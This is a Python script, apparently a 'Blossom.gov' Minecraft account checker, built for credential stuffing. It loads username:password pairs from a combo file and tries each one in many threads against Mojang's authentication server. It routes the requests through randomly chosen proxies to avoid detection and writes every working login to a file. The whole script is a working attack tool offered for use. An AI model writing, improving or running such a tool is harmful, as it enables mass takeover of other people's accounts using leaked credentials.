import requests, random, os, threading, time
from time import sleep

ui = '''
\x1b[38;5;7m                              ╔╗ ╦  ╔═╗╔═╗╔═╗╔═╗╔╦╗
\x1b[38;5;8m                              ╠╩╗║  ║ ║╚═╗╚═╗║ ║║║║
\x1b[38;5;218m                              ╚═╝╩═╝╚═╝╚═╝╚═╝╚═╝╩ ╩ . G O V
                                  Made By Ashley\x1b[38;5;7m 
'''
white = "\x1b[0m"
pink = "\x1b[38;5;218m"

usernames = []
passwords = []
invalidc = 0
validc   = 0

def run(arg):
    os.system(arg)

def load_combos():
    if os.path.exists("combo.txt"):
        with open("combo.txt", "r") as f:
            for line in f.read().splitlines():
                if ":" in line:
                    usernames.append(line.split(":")[0])
                    passwords.append(line.split(":")[-1])
    else:
        run('title Blossom.gov ^| Error')
        print(f"[{pink}!{white}] Warning No Combo File Found")
        run("pause >NUL")

def title():
    run(f"title Blossom.gov ^| Minecraft Account Checker ^| Valid: {validc} ^| Invalid: {invalidc} ^| Checked: {validc+invalidc}/{len(usernames)}")

def threads(i):
    def start():
        checker(usernames[count], passwords[count])
    count=0
    while True:
        if threading.active_count() <= i:
            threading.Thread(target = start).start()
            count+= 1
        
        if count >= len(usernames): break
    time.sleep(2)
    print(f"[{pink}!{white}] Valid: {validc}        {pink}|{white} Invalid: {invalidc}")
    run("pause >nul")

def checker(username, password):
    global validc
    global invalidc
    proxies = {'http': 'http://' + random.choice(open('proxies.txt', 'r').read().split('\n'))}
    json = {"agent": {"name": "Minecraft", "version": "1"}, "clientToken": None, "password": password, "requestUser": "true", "username": username}
    headers={"User-Agent": "MinecraftLauncher/1.0"}
    r = requests.post("https://authserver.mojang.com/authenticate", json=json, headers=headers, proxies=proxies)
    if r.status_code==200:
        with open("Valid.txt", "a") as f: f.write(f"{username}:{password}\n")
        print(f'[{pink}!{white}] Account Valid {pink}|{white} {username}{pink}:{white}{password}')
        validc += 1
        title()
    else:
        print(f'[{pink}!{white}] Account Invalid {pink}|{white} {username}{pink}:{white}{password}')
        invalidc += 1
        title()

def main():
    run('cls & mode 80,24 & title Blossom.gov ^| Minecraft Account Checker')
    print(ui)
    load_combos()
    thread_count = int(input(f"[{pink}?{white}] How Many Threads?"))
    threads(thread_count)


if __name__ == "__main__":
    main()
